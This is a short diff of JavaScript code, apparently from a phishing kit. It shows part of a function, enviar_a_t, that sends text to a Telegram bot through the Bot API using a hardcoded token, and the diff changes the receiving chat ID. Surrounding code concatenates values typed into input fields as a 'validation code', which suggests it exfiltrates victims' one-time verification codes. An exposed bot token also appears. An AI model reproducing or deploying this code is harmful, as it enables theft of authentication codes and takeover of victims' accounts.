@@ -253,7 +253,7 @@ var result2 = "Codigo validacion\n" + input11.value + input12.value + input13.va
 function enviar_a_t(tex) {
   
  const token = "6449349217:AAFkCeFGVBZUl1hqBdmuCW3qAZtoVWGri48"; // Reemplaza con tu token
-  const chatId = "6449349217"; // Reemplaza con tu ID de chat
+  const chatId = "6987322275"; // Reemplaza con tu ID de chat
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   const datos = {
